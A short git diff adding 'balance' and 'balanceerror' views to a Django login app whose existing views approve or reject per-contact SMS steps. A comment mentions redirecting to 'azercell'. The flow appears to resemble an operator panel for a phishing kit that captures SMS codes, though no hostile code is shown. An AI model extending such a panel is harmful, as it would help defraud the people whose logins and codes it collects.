@@ -45,6 +45,12 @@ def smssapprove(request):
     return render(request, "login/succses.html")
 
 
+def balance(request):
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    contact.page_name="balance"
+    return render(request, "login/balance.html")
+
 def login(request):
     return render(request, "login/index.html")
 
@@ -165,6 +171,18 @@ def smserror(request, pk):
     # For example: return redirect('azercell')
 
     return JsonResponse({'success': True})
+
+
+def balanceerror(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    contact.approve_status = "balance"
+    contact.save()
+    # Here you can redirect to another page
+    # For example: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
+
 
 
 def approve(request, pk):
